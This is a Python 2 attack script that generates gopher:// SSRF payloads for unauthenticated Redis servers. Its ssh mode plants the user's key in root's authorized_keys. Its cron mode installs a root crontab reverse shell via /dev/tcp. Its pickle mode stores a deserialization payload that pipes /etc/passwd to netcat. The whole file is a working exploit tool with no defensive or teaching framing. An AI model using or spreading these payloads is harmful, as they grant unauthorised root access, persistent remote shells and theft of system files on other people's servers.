#!/usr/bin/python2
from __future__ import print_function

import os
import sys
import base64
import urllib
import pickle
import subprocess


def generate_resp(command):
    res = ""

    if isinstance(command, list):
        pass
    else:
        command = command.split(" ")
    
    res += "*{}\n".format(len(command))
    for cmd in command:
        res += "${}\n".format(len(cmd))
        res += "{}\n".format(cmd)
    
    return res

def get_public_ip():

    try:
        return subprocess.check_output(["curl","-s","ident.me"])
    except:
        return None

def generate_gopher(payload):
    
    final_payload = "gopher://127.0.0.1:6379/_{}".format(urllib.quote(payload))
    
    return final_payload

def ssh_key_write(ssh_dir="/root/.ssh"):
    res = ""
    pubkey_path = "/home/{}/.ssh/id_rsa.pub".format(os.getlogin());

    if(not os.path.exists(pubkey_path)):
        print("Please Run : ssh-keygen -t rsa")
        exit(1)

    pubkey = "\n\n" + open(pubkey_path,"r").read()

    res += generate_resp('flushall')
    # res += generate_resp('set 1 {}'.format(pubkey))
    res += generate_resp("set 1 {DUMMY}".format(DUMMY="A" * len(pubkey)))
    res += generate_resp('config set dir {}'.format(ssh_dir))
    res += generate_resp('config set dbfilename authorized_keys')
    res += generate_resp('save')
    res += generate_resp('quit')

    res = res.replace("A" * len(pubkey),pubkey)
    res = res.replace("\n","\r\n")
    
    print(generate_gopher(res))

    print("")
    print("")
    print("====================================================")
    print("After payload executed, try ssh root@server_hostname")
    print("====================================================")


def cron_write(ip, port=8080, os_type="centos"):

    if os_type == "centos":
        crontab_path = "/var/spool/cron/"
    else:
        crontab_path = "/var/spool/cron/crontabs"

    cron_command = "\n\n*/1 * * * * /bin/bash -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'\n\n".format(ip=ip, port=port)
    res = ""

    res += generate_resp('flushall')
    res += generate_resp("set 1 {DUMMY}".format(DUMMY="A" * len(cron_command)))
    res += generate_resp('config set dir {}'.format(crontab_path))
    res += generate_resp('config set dbfilename root')
    res += generate_resp('save')
    res += generate_resp('quit')

    res = res.replace("\n","\r\n")
    res = res.replace("A" * len(cron_command), cron_command)

    print(generate_gopher(res))

class PickleExploit(object):

    def __reduce__(self):
        ip = "127.0.0.1"
        port = "9091"
        cmd = 'cat /etc/passwd | nc {} {}'.format(ip, port)
        return (os.system, (cmd,))

def pickle_payload(key):
    res = ""

    payload = pickle.dumps(PickleExploit())
    res += "\r\n"
    res += generate_resp("set {} {}".format(key, base64.b64encode(payload)))

    res = res.replace("\n", "\r\n")

    print(generate_gopher(res).replace("gopher","http"))



if len(sys.argv) < 2:
    print("cron or ssh or pickle")
    sys.exit(0)

if sys.argv[1] == "cron":
    ip = raw_input("Reverse IP > ") or get_public_ip() or "127.0.0.1"
    port = raw_input("Port > ") or "8080"
    os_type = raw_input("Centos/Ubuntu (Default Centos)") or "centos"
    cron_write(ip=ip,port=port)

if sys.argv[1] == "ssh":
    ssh_key_write()

if sys.argv[1] == "pickle":
    key = raw_input("Key name > ")
    pickle_payload(key)